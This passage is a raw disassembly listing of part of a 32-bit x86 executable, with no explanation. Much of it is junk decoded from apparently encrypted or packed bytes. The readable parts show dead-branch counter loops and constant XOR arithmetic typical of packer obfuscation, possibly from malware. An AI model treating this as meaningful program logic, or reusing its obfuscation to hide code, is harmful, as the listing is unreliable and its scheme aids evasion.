  405935:	xor    DWORD PTR [esi-0x22d14124],ecx
  40593b:	or     ah,BYTE PTR [edi-0x42]
  40593e:	mov    WORD PTR [eax],ds
  405940:	mov    ebp,0xaba96b2a
  405945:	in     al,dx
  405946:	cdq    
  405947:	pop    ds
  405948:	ret    
  405949:	adc    eax,0x62e6aaa7
  40594e:	aad    0x91
  405950:	and    BYTE PTR [edx+0x11],ah
  405953:	mov    bl,0x3d
  405955:	xchg   esp,eax
  405956:	cmc    
  405957:	inc    ecx
  405958:	mov    BYTE PTR [ecx-0x57f664fa],cl
  40595e:	lods   al,BYTE PTR ds:[esi]
  40595f:	shl    ah,cl
  405961:	dec    ebp
  405962:	retf   
  405963:	or     al,0xba
  405965:	and    BYTE PTR [ebx+eax*8-0x639ea07c],bh
  40596c:	mov    eax,0x427c0d09
  405971:	retf   
  405972:	and    ebp,esp
  405974:	out    dx,al
  405975:	pop    ebp
  405976:	mov    edx,0x9ecd4182
  40597b:	xor    eax,0x930f8b6d
  405980:	scas   al,BYTE PTR es:[edi]
  405981:	push   ss
  405982:	sub    eax,0x4580d527
  405987:	or     al,0x31
  405989:	mov    cl,0x69
  40598b:	cmc    
  40598c:	fs sahf 
  40598e:	xchg   esi,eax
  40598f:	js     0x40598e
  405991:	pop    ss
  405992:	mov    eax,ds:0x75736271
  405997:	daa    
  405998:	ins    DWORD PTR es:[edi],dx
  405999:	cwde   
  40599a:	imul   ecx,DWORD PTR [ecx-0x45],0xc0695e05
  4059a1:	dec    edx
  4059a2:	int3   
  4059a3:	int3   
  4059a4:	popa   
  4059a5:	jbe    0x405992
  4059a7:	sbb    cl,BYTE PTR [ebx-0x75958924]
  4059ad:	mov    bh,0xd2
  4059af:	(bad)  
  4059b0:	mov    cl,0x9c
  4059b2:	(bad)
  4059b5:	ficom  DWORD PTR [edi]
  4059b7:	dec    edi
  4059b8:	jg     0x40599b
  4059ba:	push   edx
  4059bb:	cdq    
  4059bc:	loop   0x4059eb
  4059be:	mov    ecx,DWORD PTR ds:0x40d64c
  4059c4:	add    DWORD PTR [eax],ecx
  4059c6:	pop    edi
  4059c7:	pop    esi
  4059c8:	pop    ebx
  4059c9:	leave  
  4059ca:	ret    
  4059cb:	push   ebp
  4059cc:	mov    ebp,esp
  4059ce:	sub    esp,0x44
  4059d1:	push   edi
  4059d2:	sub    eax,DWORD PTR ds:0x4233c7
  4059d8:	mov    eax,DWORD PTR [ebp+0xc]
  4059db:	or     DWORD PTR ds:0x417d1d,edx
  4059e1:	mov    DWORD PTR [ebp-0x10],eax
  4059e4:	mov    DWORD PTR ds:0x417d25,0x17
  4059ee:	cmp    DWORD PTR ds:0x417d25,0x0
  4059f5:	je     0x405a59
  4059fb:	cmp    DWORD PTR ds:0x417d25,0x6
  405a02:	jne    0x405a2b
  405a08:	push   DWORD PTR [ebp-0x24]
  405a0b:	push   DWORD PTR [ebp-0x28]
  405a0e:	push   0x417d15
  405a13:	push   0x80ed
  405a18:	push   0x67be
  405a1d:	push   0x6b4c
  405a22:	push   DWORD PTR [ebp-0x20]
  405a25:	call   DWORD PTR ds:0x40d1cc
  405a2b:	cmp    DWORD PTR ds:0x417d25,0x7
  405a32:	jne    0x405a47
  405a38:	xor    ecx,ecx
  405a3a:	or     ecx,DWORD PTR ds:0x417d25
  405a40:	dec    ecx
  405a41:	mov    DWORD PTR ds:0x417d25,ecx
  405a47:	mov    ecx,DWORD PTR ds:0x417d25
  405a4d:	dec    ecx
  405a4e:	mov    DWORD PTR ds:0x417d25,ecx
  405a54:	jmp    0x4059ee
  405a59:	mov    eax,DWORD PTR [ebp+0x8]
  405a5c:	or     DWORD PTR ds:0x417d11,0x3fc5
  405a66:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  405a6d:	xor    ecx,ecx
  405a6f:	add    ecx,DWORD PTR ds:0x4233c3
  405a75:	and    DWORD PTR ds:0x41aa46,ecx
  405a7b:	mov    DWORD PTR [ebp-0x20],0xf89c853b
  405a82:	mov    edx,DWORD PTR [ebp+0x8]
  405a85:	mov    DWORD PTR [ebp-0x40],eax
  405a88:	mov    eax,0x7510859
  405a8d:	xor    edx,eax
  405a8f:	adc    ecx,ecx
  405a91:	mov    ecx,0x32729f
  405a96:	movzx  edi,WORD PTR ds:0x41503d
  405a9d:	sbb    DWORD PTR ds:0x4233cf,edi
  405aa3:	add    edx,ecx
  405aa5:	add    DWORD PTR ds:0x4122e4,0x1575
  405aaf:	mov    DWORD PTR [ebp-0x8],edx
  405ab2:	jmp    0x405c04
  405ab7:	(bad)  [edi+ebp*4-0x19]
  405abb:	mov    eax,ds:0x80785be5
  405ac0:	cmp    DWORD PTR ds:[edi],edx
  405ac3:	or     al,0xd8
  405ac5:	sbb    BYTE PTR [ebx],ah
  405ac7:	xchg   BYTE PTR [ebx],cl
  405ac9:	jle    0x405b49
  405acb:	and    edi,DWORD PTR [edi+0x7e]
  405ace:	jle    0x405a55
  405ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ad1:	es or  ecx,eax
  405ad4:	push   esp
  405ad5:	fistp  DWORD PTR [ebp+0x1978e25c]
  405adb:	enter  0x2c82,0x21
  405adf:	push   cs
  405ae0:	add    dl,ch
  405ae2:	aaa    
  405ae3:	jne    0x405b42
  405ae5:	sbb    al,0x4e
  405ae7:	outs   dx,DWORD PTR ds:[esi]
  405ae8:	scas   eax,DWORD PTR es:[edi]
  405ae9:	mov    bh,0x9b
  405aeb:	dec    esi
  405aec:	fstp   QWORD PTR [esi-0x711c61bf]
  405af2:	mov    ds:0xaca5e3b6,al
  405af7:	es push cs
  405af9:	and    eax,0x7956cb5
  405afe:	fnstcw WORD PTR [edx-0x13]
  405b01:	mov    eax,ds:0x60ae2f8e
  405b06:	je     0x405b6f
  405b08:	or     dh,BYTE PTR ds:0x1a747970
  405b0e:	pop    ds
  405b0f:	repz dec esi
  405b11:	mov    al,ds:0x91c271ce
  405b16:	rol    DWORD PTR [esi],cl
  405b18:	(bad)  
  405b19:	rol    DWORD PTR [ebx+0x78b89d26],cl
  405b1f:	into   
  405b20:	xor    eax,edx
  405b22:	int    0xbe
  405b24:	mov    ds:0x7751bd56,eax
  405b29:	pop    eax
  405b2a:	jg     0x405adc
  405b2c:	add    dl,BYTE PTR [eax-0x32]
  405b2f:	sahf   
  405b30:	(bad)  
  405b32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b33:	pop    edi
  405b34:	aaa    
  405b35:	stos   DWORD PTR es:[edi],eax
  405b36:	mov    edx,0x3f23a8dc
  405b3b:	jl     0x405b0f
  405b3d:	arpl   WORD PTR [ecx+ecx*1],di
  405b40:	jo     0x405b1c
  405b42:	push   0xfffffff5
  405b44:	add    ebp,DWORD PTR [esi+0x26]
  405b47:	je     0x405b1f
  405b49:	scas   al,BYTE PTR es:[edi]
  405b4a:	daa    
  405b4b:	push   eax
  405b4c:	arpl   WORD PTR [edi+0x77],di
  405b4f:	push   es
  405b50:	daa    
  405b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b52:	ret    
  405b53:	(bad)  
  405b54:	ins    BYTE PTR es:[edi],dx
  405b55:	xor    ax,0x1dfb
  405b59:	mov    ds:0x1fcebd29,al
  405b5e:	sub    eax,0x22423487
  405b63:	ret    0x3de6
  405b66:	fsubr  st(5),st
  405b68:	dec    esp
  405b69:	(bad)  
  405b6a:	sub    al,0xce
  405b6c:	pop    eax
  405b6d:	ret    0x95de
  405b70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b71:	loop   0x405b18
  405b73:	call   0x6e198047
  405b78:	repz sbb cl,BYTE PTR [ebx+0x7767ea33]
  405b7f:	test   BYTE PTR [edi],bh
  405b81:	fwait
  405b82:	jl     0x405b73
  405b84:	add    BYTE PTR [ecx+esi*8+0x0],ch
  405b88:	pusha  
  405b89:	mov    bl,0xed
  405b8b:	outs   dx,DWORD PTR ds:[esi]
  405b8c:	mov    ds:0xa2c3a688,eax
  405b91:	test   BYTE PTR [eax+0x19],cl
  405b94:	and    DWORD PTR [esi-0x6c6a53a5],ebp
  405b9a:	das    
  405b9b:	pop    ds
  405b9c:	pop    es
  405b9d:	ret    
  405b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b9f:	mov    ebx,0x3ee73aa
  405ba4:	in     al,0xce
  405ba6:	push   esp
  405ba7:	xor    al,0x77
  405ba9:	adc    BYTE PTR [eax],dh
  405bab:	xchg   esi,eax
  405bac:	add    BYTE PTR ss:[eax+0x20101f3b],bh
  405bb3:	adc    eax,DWORD PTR ds:0x39b7f8e5
  405bb9:	sub    dh,BYTE PTR [edi-0x70]
  405bbc:	cld    
  405bbd:	inc    edi
  405bbe:	mov    esi,0x887c8ffc
  405bc3:	xchg   edi,eax
  405bc4:	jns    0x405bf5
  405bc6:	adc    cl,BYTE PTR ss:[edx-0x72]
  405bca:	scas   eax,DWORD PTR es:[edi]
  405bcb:	adc    al,BYTE PTR [eax]
  405bcd:	jae    0x405b8e
  405bcf:	pushf  
  405bd0:	dec    ebp
  405bd1:	test   al,0xca
  405bd3:	xchg   edi,eax
  405bd4:	sbb    DWORD PTR [eax],edi
  405bd6:	enter  0x9e88,0xba
  405bda:	dec    esi
  405bdb:	lahf   
  405bdc:	cmp    edi,ebp
  405bde:	adc    al,0xa7
  405be0:	mov    bl,0xe1
  405be2:	int    0xb2
  405be4:	push   esp
  405be5:	jp     0x405bda
  405be7:	shl    edx,0x52
  405bea:	fcomp  QWORD PTR [edx-0x5e2ffe01]
  405bf0:	push   0x7f9c79f3
  405bf5:	call   0xd73c:0x93cd9454
  405bfc:	scas   al,BYTE PTR es:[edi]
  405bfd:	ret    
  405bfe:	jge    0x405c4f
  405c00:	inc    DWORD PTR [ecx]
  405c02:	lock mov al,ds:0x8108558b
  405c08:	and    eax,0x4233d7
  405c0d:	add    BYTE PTR [eax],al
  405c0f:	add    BYTE PTR [eax],al
  405c11:	jmp    0x405c25
  405c16:	xor    edi,edi
  405c18:	or     edi,DWORD PTR ds:0x4233d7
  405c1e:	inc    edi
  405c1f:	mov    DWORD PTR ds:0x4233d7,edi
  405c25:	cmp    DWORD PTR ds:0x4233d7,0x11
  405c2c:	jae    0x405c53
  405c32:	cmp    DWORD PTR ds:0x4233d7,0x1a
  405c39:	jne    0x405c48
  405c3f:	push   DWORD PTR [ebp-0x1c]
  405c42:	call   DWORD PTR ds:0x40d29c
  405c48:	jmp    0x405c16
  405c4d:	xor    DWORD PTR ds:0x4122e8,ebx
  405c53:	xor    edx,eax
  405c55:	add    edx,ecx
  405c57:	jmp    0x405da9
  405c5c:	xchg   edi,eax
  405c5d:	(bad)  
  405c5e:	call   0xe86f:0x6bdabbc6
  405c65:	pop    ds
  405c66:	jb     0x405cc2
  405c68:	in     eax,dx
  405c69:	imul   ebx,DWORD PTR [edx+0x11],0x4b
  405c6d:	or     BYTE PTR [esi+0x7e],bh
  405c70:	and    edi,DWORD PTR [edi+0x7e]
  405c73:	jle    0x405cda
  405c75:	loopne 0x405c93
  405c77:	sbb    eax,0x73c84306
  405c7c:	fdivr  QWORD PTR [ebx+0x7854a2fb]
  405c82:	lahf   
  405c83:	dec    ecx
  405c84:	out    0x43,al
  405c86:	in     eax,dx
  405c87:	push   edi
  405c88:	in     eax,0xaf
  405c8a:	xchg   esp,eax
  405c8b:	nop
  405c8c:	and    eax,0x5a004d41
  405c91:	jmp    0x405c60
  405c93:	jl     0x405d0f
  405c95:	mov    esi,0x9dd10bef
  405c9a:	ins    DWORD PTR es:[edi],dx
  405c9b:	repz arpl sp,di
  405c9e:	ins    DWORD PTR es:[edi],dx
  405c9f:	call   FWORD PTR [ecx+0x6c]
  405ca2:	mov    al,0xd1
  405ca4:	cld    
  405ca5:	push   esi
  405ca6:	fst    DWORD PTR ds:0xffcd9818
  405cac:	in     al,dx
  405cad:	lods   eax,DWORD PTR ds:[esi]
  405cae:	xchg   esi,eax
  405caf:	lock iret 
  405cb1:	inc    eax
  405cb2:	into   
  405cb3:	call   0x47e5e859
  405cb8:	cdq    
  405cb9:	dec    edi
  405cba:	call   0x2e77:0xdc88c934
  405cc1:	stos   BYTE PTR es:[edi],al
  405cc2:	loope  0x405d2b
  405cc4:	sub    cl,BYTE PTR [ebp+0x5545c720]
  405cca:	mov    eax,0xc9ec8c3d
  405ccf:	popa   
  405cd0:	sub    al,0x8b
  405cd2:	xor    DWORD PTR [ecx-0x7e],esp
  405cd5:	xor    eax,0xca002042
  405cda:	idiv   DWORD PTR [eax-0x68]
  405cdd:	sbb    ch,BYTE PTR [ebx+0x2b4ef37d]
  405ce3:	in     eax,dx
  405ce4:	jne    0x405d40
  405ce6:	mov    dl,0x34
  405ce9:	mov    ch,0x75
  405ceb:	xchg   ebp,eax
  405cec:	mov    dl,0xbe
  405cee:	dec    edi
  405cef:	popf   
  405cf0:	push   cs
  405cf1:	sbb    DWORD PTR [esi+0x76],ebp
  405cf4:	fidiv  WORD PTR [edi+esi*2+0x42]
  405cf8:	lods   al,BYTE PTR ds:[esi]
  405cf9:	out    dx,al
  405cfa:	pop    esi
  405cfb:	fs loope 0x405cfd
  405cfe:	push   edx
  405cff:	mov    BYTE PTR [ebx+0x34226094],cl
  405d05:	mov    esp,0xfe2d9e1f
  405d0a:	ja     0x405d0d
  405d0c:	(bad)  
  405d0d:	and    al,0x8c
  405d0f:	or     al,0x54
  405d11:	jns    0x405cf5
  405d13:	lods   al,BYTE PTR ds:[esi]
  405d14:	ins    DWORD PTR es:[edi],dx
  405d15:	ds dec edx
  405d17:	imul   edi,DWORD PTR [ebp+0xf],0xd7ae2f85
  405d1e:	push   ds
  405d1f:	push   ss
  405d20:	mov    al,ds:0x28d433aa
  405d25:	mov    ch,0x88
  405d27:	popf   
  405d28:	pop    ebx
  405d29:	neg    esp
  405d2b:	aas    
  405d2c:	out    0xb0,eax
  405d2e:	dec    ebp
  405d2f:	ret    
  405d30:	adc    BYTE PTR [ebx+ebx*1+0x6c91e0a8],bh
  405d37:	cld    
  405d38:	mov    al,0xb1
  405d3a:	popa   
  405d3b:	imul   esp,DWORD PTR [eax],0x8d4f9c77
  405d41:	(bad)  
  405d42:	and    dh,BYTE PTR [ebp+0x16029008]
  405d48:	and    eax,DWORD PTR [ebp+ebp*8+0x23]
  405d4c:	outs   dx,BYTE PTR ds:[esi]
  405d4d:	cwde   
  405d4e:	lods   al,BYTE PTR ds:[esi]
  405d4f:	xlat   BYTE PTR ds:[ebx]
  405d50:	sub    edx,DWORD PTR [ebp-0x6d]
  405d53:	mov    bh,0xb2
  405d55:	push   ebp
  405d56:	mov    ds:0x550372f8,al
  405d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d5c:	in     al,dx
  405d5d:	mov    WORD PTR [ebx],cs
  405d5f:	dec    ecx
  405d60:	shl    BYTE PTR [ecx],cl
  405d62:	retf   
  405d63:	dec    ebp
  405d64:	push   0xfb909751
  405d69:	out    0x5f,eax
  405d6b:	jge    0x405cfd
  405d6d:	inc    eax
  405d6e:	and    ah,dh
  405d70:	js     0x405d8f
  405d72:	sbb    ch,0xd0
  405d75:	ins    DWORD PTR es:[edi],dx
  405d76:	adc    BYTE PTR [ecx-0x5649385],0x9
  405d7d:	daa    
  405d7e:	push   eax
  405d7f:	loope  0x405dfc
  405d81:	aad    0xb3
  405d83:	adc    eax,ecx
  405d85:	loope  0x405d64
  405d87:	dec    ebx
  405d88:	aam    0x8f
  405d8a:	mov    bh,0x82
  405d8c:	pop    edx
  405d8d:	sbb    eax,0x998d9ac7
  405d92:	push   esi
  405d93:	stos   BYTE PTR es:[edi],al
  405d94:	outs   dx,DWORD PTR ds:[esi]
  405d95:	or     ah,BYTE PTR [edi+0x6a]
  405d98:	js     0x405d50
  405d9a:	sbb    esi,DWORD PTR [ebx-0x54]
  405d9d:	xchg   ecx,eax
  405d9e:	push   ss
  405d9f:	js     0x405d30
  405da1:	and    bh,BYTE PTR [ebp+0xa]
  405da4:	inc    edx
  405da5:	popf   
  405da6:	jns    0x405d9e
  405da8:	jle    0x405d33
  405daa:	push   ebp
  405dab:	or     al,0x47
  405dad:	jmp    0x405eff
  405db2:	or     eax,0xb8afae9b
  405db7:	mov    ebx,0x598db90d
  405dbc:	or     al,0x3
  405dbe:	adc    ch,BYTE PTR [ebp+0x31]
  405dc1:	add    eax,0x7e7e0e7c
  405dc6:	and    edi,DWORD PTR [edi+0x7e]
  405dc9:	jle    0x405e0b
  405dcb:	push   esi
  405dcc:	ja     0x405d6e
  405dce:	cmp    DWORD PTR [edx+0x50],edx
  405dd1:	out    0xa,al
  405dd3:	jbe    0x405d96
  405dd5:	fcom   QWORD PTR [esp+ebx*2-0x7f]
  405dd9:	mov    ds:0x20eec7fc,al
  405dde:	sbb    dl,dh
  405de0:	call   0xcc39:0xdbd479b4
  405de7:	adc    ebp,eax
  405de9:	shl    ah,1
  405deb:	and    DWORD PTR [ebp+0x7b],ebx
  405dee:	(bad)  
  405def:	pop    edi
  405df0:	sub    cl,bh
  405df2:	mov    esi,DWORD PTR [ebx+ebx*8]
  405df5:	fadd   st(5),st
  405df7:	stc    
  405df8:	jmp    0x4c4316fa
  405dfd:	fistp  WORD PTR ds:0x1b5282cf
  405e03:	xchg   ebx,eax
  405e04:	xchg   esi,eax
  405e05:	call   0xeeaf0b8f
  405e0a:	add    eax,0x27cb31fd
  405e0f:	repz iret 
  405e11:	aam    0x33
  405e13:	mov    bh,BYTE PTR [edi]
  405e15:	or     al,0x6e
  405e17:	mov    eax,0x676c980a
  405e1c:	fcomi  st,st(3)
  405e1e:	sub    al,0xb5
  405e20:	push   esi
  405e21:	pop    esp
  405e22:	jnp    0x405e7d
  405e24:	les    ecx,FWORD PTR [esi]
  405e26:	aaa    
  405e27:	push   edi
  405e28:	(bad)  
  405e29:	xor    ebx,DWORD PTR [esi]
  405e2b:	xor    DWORD PTR ds:0xab84afcd,esp
  405e31:	mov    ch,0xc5
  405e33:	cmp    al,0x31
  405e35:	cmp    al,0x6f
  405e37:	rcl    ah,cl
  405e39:	lock lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e3c:	sub    edi,DWORD PTR [ebp+ebp*2+0x10]
  405e40:	lods   eax,DWORD PTR ds:[esi]
  405e41:	add    esp,ecx
  405e43:	sbb    DWORD PTR [ecx+eiz*2-0x653a66f3],ebx
  405e4a:	shl    cl,cl
  405e4c:	jo     0x405e95
  405e4e:	popf   
  405e4f:	push   edx
  405e50:	loop   0x405e41
  405e52:	retf   0x51fe
  405e55:	jmp    0x451:0x4902084e
  405e5c:	mov    eax,0xb809a25b
  405e61:	data16 loopne 0x405e80
  405e64:	fst    st(7)
  405e66:	mov    dh,0x5c
  405e68:	xor    dh,dh
  405e6a:	in     al,dx
  405e6b:	pushf  
  405e6c:	jno    0x405e5e
  405e6e:	inc    eax
  405e6f:	jno    0x405ee7
  405e71:	stos   BYTE PTR es:[edi],al
  405e72:	pop    ebp
  405e73:	scas   eax,DWORD PTR es:[edi]
  405e74:	xchg   DWORD PTR [esi],ebp
  405e76:	(bad)  
  405e77:	xor    esi,DWORD PTR [esi+ebx*2+0x62]
  405e7b:	pop    es
  405e7c:	lock out 0x9f,eax
  405e7f:	(bad)  
  405e80:	(bad)  
  405e81:	dec    edi
  405e82:	in     al,dx
  405e83:	adc    bl,BYTE PTR [esi-0x45]
  405e86:	lds    edi,FWORD PTR ds:0x8a103260
  405e8c:	cmp    DWORD PTR [esi],eax
  405e8e:	xchg   ebp,eax
  405e8f:	cmp    esi,DWORD PTR [ebp+0x2d]
  405e92:	xor    BYTE PTR [ebp+0x10005842],al
  405e98:	mov    esi,0x707f907
  405e9d:	jecxz  0x405ec1
  405e9f:	cwde   
  405ea0:	push   esi
  405ea1:	sbb    eax,0x8301dd58
  405ea6:	xchg   esi,eax
  405ea7:	into   
  405ea8:	cmp    al,0x2c
  405eaa:	sbb    BYTE PTR [ebp+0x7fa478b9],0x6d
  405eb1:	repz test eax,0x3cd6d31e
  405eb7:	lea    ecx,[ebx]
  405eb9:	xchg   esi,eax
  405eba:	and    DWORD PTR [edx+0x506587f5],ebx
  405ec0:	shl    al,cl
  405ec2:	cli    
  405ec3:	jnp    0x405eac
  405ec5:	fst    DWORD PTR [edi-0x54]
  405ec8:	sub    al,BYTE PTR [edi+esi*1-0x5d657915]
  405ecf:	hlt    
  405ed0:	inc    DWORD PTR [esi+0x14eefae9]
  405ed6:	mov    al,al
  405ed8:	sub    DWORD PTR [ebp+0x5f],0x28a0a437
  405edf:	push   ecx
  405ee0:	mov    ?,WORD PTR [eax]
  405ee2:	sahf   
  405ee3:	mov    WORD PTR [eax+eiz*1+0x4b],cs
  405ee7:	dec    esi
  405ee8:	ins    BYTE PTR es:[edi],dx
  405ee9:	xor    dl,bh
  405eeb:	lock (bad) 
  405eed:	shl    BYTE PTR [ecx],cl
  405eef:	adc    eax,0xd4076662
  405ef4:	rol    esi,1
  405ef6:	pop    esp
  405ef7:	adc    dh,BYTE PTR [esi+0x4a228b08]
  405efd:	dec    eax
  405efe:	xrelease mov DWORD PTR [ebp-0x4],0xf89c85d8
  405f06:	xor    edi,edi
  405f08:	xor    edi,DWORD PTR ds:0x415039
  405f0e:	adc    edi,DWORD PTR ds:0x4233bf
  405f14:	mov    DWORD PTR ds:0x415039,edi
  405f1a:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  405f21:	mov    DWORD PTR [ebp-0x2c],0xf89c853d
  405f28:	adc    edi,edi
  405f2a:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  405f31:	or     DWORD PTR ds:0x4233cf,edx
  405f37:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  405f3e:	mov    DWORD PTR ds:0x417d11,0x15
  405f48:	cmp    DWORD PTR ds:0x417d11,0x0
  405f4f:	je     0x405fae
  405f55:	cmp    DWORD PTR ds:0x417d11,0x5
  405f5c:	jne    0x405f7c
  405f62:	push   0x43a6
  405f67:	push   0x41aab1
  405f6c:	push   0x41aae2
  405f71:	push   0x400000
  405f76:	call   DWORD PTR ds:0x40d1d0
  405f7c:	cmp    DWORD PTR ds:0x417d11,0x6
  405f83:	jne    0x405f96
  405f89:	mov    edi,DWORD PTR ds:0x417d11
  405f8f:	dec    edi
  405f90:	mov    DWORD PTR ds:0x417d11,edi
  405f96:	mov    edi,DWORD PTR ds:0x417d11
  405f9c:	dec    edi
  405f9d:	mov    DWORD PTR ds:0x417d11,edi
  405fa3:	jmp    0x405f48
  405fa8:	xor    edi,DWORD PTR ds:0x417d1d
  405fae:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  405fb5:	and    DWORD PTR ds:0x4122f4,0xe44
  405fbf:	mov    DWORD PTR [ebp-0x3c],0xf89c8531
  405fc6:	or     DWORD PTR ds:0x417d19,0x6f97
  405fd0:	mov    edx,DWORD PTR [ebp+0x8]
  405fd3:	and    DWORD PTR ds:0x417d25,0x0
  405fdd:	jmp    0x405fef
  405fe2:	mov    edi,DWORD PTR ds:0x417d25
  405fe8:	inc    edi
  405fe9:	mov    DWORD PTR ds:0x417d25,edi
  405fef:	cmp    DWORD PTR ds:0x417d25,0x14
  405ff6:	jae    0x40601f
  405ffc:	cmp    DWORD PTR ds:0x417d25,0x1c
  406003:	jne    0x406014
  406009:	push   0x67ac
  40600e:	call   DWORD PTR ds:0x40d2a0
  406014:	jmp    0x405fe2
  406019:	sub    edi,DWORD PTR ds:0x412308
  40601f:	xor    edx,eax
  406021:	mov    edi,DWORD PTR [ebp-0x10]
  406024:	add    edx,ecx
  406026:	cmp    edi,edx
  406028:	mov    DWORD PTR ds:0x4122f8,0x5602
  406032:	je     0x407428
  406038:	mov    DWORD PTR ds:0x415039,0xf2d
  406042:	jmp    0x406194
  406047:	lock mov ebx,0xdc791c5b
  40604d:	jns    0x40600a
  40604f:	mov    eax,ds:0xdb13c5
  406054:	push   0xffffffe0
  406056:	scas   eax,DWORD PTR es:[edi]
  406057:	and    DWORD PTR [edi],ecx
  406059:	jle    0x4060d9
  40605b:	and    edi,DWORD PTR [edi+0x7e]
  40605e:	jle    0x40607d
  406060:	iret   
  406061:	fisubr DWORD PTR [edi+0x5bc70d47]
  406067:	loope  0x4060aa
  406069:	scas   al,BYTE PTR es:[edi]
  40606a:	mov    eax,DWORD PTR [ebx]
  40606c:	int    0x29
  40606e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40606f:	lds    ebp,FWORD PTR [ecx*4+0xd71383]
  406076:	imul   BYTE PTR [edi]
  406078:	call   0x7ff5e987
  40607d:	fcomi  st,st(1)
  40607f:	push   es
  406080:	stos   DWORD PTR es:[edi],eax
  406081:	mov    ds:0x75d1400d,ax
  406087:	inc    ecx
  406088:	mov    ds:0x7d88b2a2,eax
  40608d:	out    0x0,eax
  40608f:	add    eax,0x68e7765f
  406094:	mov    edx,0xd84ff424
  406099:	scas   eax,DWORD PTR es:[edi]
  40609a:	add    BYTE PTR [esp+ebx*2+0x2b771d96],0xdc
  4060a2:	shl    DWORD PTR [edi],1
  4060a4:	pusha  
  4060a5:	and    esi,DWORD PTR [esi+esi*1+0x24bb1ba6]
  4060ac:	xchg   si,ax
  4060ae:	mov    esp,0x6b9cd704
  4060b3:	cwde   
  4060b4:	fwait
  4060b5:	sub    al,0x8a
  4060b7:	pop    ss
  4060b8:	aaa    
  4060b9:	pop    esi
  4060ba:	dec    edx
  4060bb:	pop    esp
  4060bc:	aas    
  4060bd:	inc    esi
  4060be:	inc    esp
  4060bf:	xlat   BYTE PTR ds:[ebx]
  4060c0:	repz xchg esi,eax
  4060c2:	push   edx
  4060c3:	jge    0x4060e8
  4060c5:	xchg   BYTE PTR [ebx-0x5bb10db3],ch
  4060cb:	inc    ecx
  4060cc:	bound  edi,QWORD PTR [edi+0x1d]
  4060cf:	outs   dx,DWORD PTR ds:[esi]
  4060d0:	lods   al,BYTE PTR ds:[esi]
  4060d1:	sbb    al,0x72
  4060d3:	jo     0x406084
  4060d5:	ror    DWORD PTR [ebx],0xda
  4060d8:	sbb    eax,DWORD PTR [eax+esi*2+0xd0d1d34]
  4060df:	jl     0x4060a1
  4060e1:	js     0x4060fa
  4060e3:	cmp    al,ch
  4060e5:	aaa    
  4060e6:	adc    BYTE PTR [edi],ch
  4060e8:	mov    ebp,0xe1030d64
  4060ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060ee:	mov    ss,ebx
  4060f0:	add    al,BYTE PTR [edi]
  4060f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060f3:	push   ds
  4060f4:	jmp    0x1c74:0xe753c414
  4060fb:	mov    ?,WORD PTR cs:[ebp+0x73]
  4060ff:	(bad)  
  406100:	lods   eax,DWORD PTR ds:[esi]
  406101:	xor    eax,0xd4732cda
  406106:	and    esp,ebx
  406108:	jmp    0x844273ba
  40610d:	loope  0x406126
  40610f:	mov    ecx,0xff434d5d
  406114:	stc    
  406115:	shl    bh,cl
  406117:	(bad)  
  406118:	jmp    0xbbc1:0x597ef9f6
  40611f:	(bad)  
  406120:	out    dx,al
  406121:	daa    
  406122:	pop    edx
  406123:	sub    ecx,esp
  406125:	jmp    0xa607:0xf264d74
  40612c:	test   cl,ah
  40612e:	lods   al,BYTE PTR ds:[esi]
  40612f:	stos   DWORD PTR es:[edi],eax
  406130:	(bad)  
  406131:	xchg   edx,eax
  406132:	pop    ds
  406133:	and    eax,esi
  406135:	dec    edi
  406136:	mov    ah,0xca
  406138:	lahf   
  406139:	jmp    0x6be1:0xa1e30d26
  406140:	xor    DWORD PTR [eax-0x7ef7a4a0],esi
  406146:	sub    DWORD PTR [esi],eax
  406148:	push   cs
  406149:	or     BYTE PTR [ebx],bh
  40614b:	cli    
  40614c:	fwait
  40614d:	sbb    al,0x9e
  40614f:	sbb    eax,0x5c69455f
  406154:	and    al,0xac
  406156:	retf   0x93fb
  406159:	test   DWORD PTR [edi+0x1194003a],edi
  40615f:	push   esi
  406160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406161:	lds    esp,FWORD PTR [edx+0x55]
  406164:	(bad)  
  406165:	xchg   DWORD PTR [esp+ebp*8],edi
  406168:	out    0x9b,eax
  40616a:	push   edx
  40616b:	jmp    0x4061ab
  40616d:	jnp    0x4060f8
  40616f:	int    0x57
  406171:	retf   
  406172:	push   eax
  406173:	mov    bh,0x20
  406175:	mov    BYTE PTR [eax-0x5a],cl
  406178:	ficomp WORD PTR [edx-0x47]
  40617b:	jle    0x406129
  40617d:	ja     0x4061b1
  40617f:	mov    ah,0x9f
  406181:	push   ebp
  406182:	std    
  406183:	shl    BYTE PTR [ecx*2-0x7702df32],1
  40618a:	iret   
  40618b:	sbb    esi,DWORD PTR [edi+0x3c]
  40618e:	sub    ecx,DWORD PTR [edx]
  406190:	mov    bh,0x6a
  406192:	mov    esi,0xc5e9531b
  406197:	sldt   WORD PTR [eax]
  40619a:	and    DWORD PTR ds:0x412300,0x0
  4061a4:	jmp    0x4061b6
  4061a9:	mov    edx,DWORD PTR ds:0x412300
  4061af:	inc    edx
  4061b0:	mov    DWORD PTR ds:0x412300,edx
  4061b6:	cmp    DWORD PTR ds:0x412300,0x1e
  4061bd:	jae    0x4061ea
  4061c3:	cmp    DWORD PTR ds:0x412300,0x2a
  4061ca:	jne    0x4061e3
  4061d0:	push   DWORD PTR [ebp-0x10]
  4061d3:	push   0x41ab61
  4061d8:	push   0x41aa98
  4061dd:	call   DWORD PTR ds:0x40d000
  4061e3:	jmp    0x4061a9
  4061e8:	adc    edi,edi
  4061ea:	mov    edx,DWORD PTR [ebp-0x8]
  4061ed:	mov    DWORD PTR ds:0x4122f4,0x11
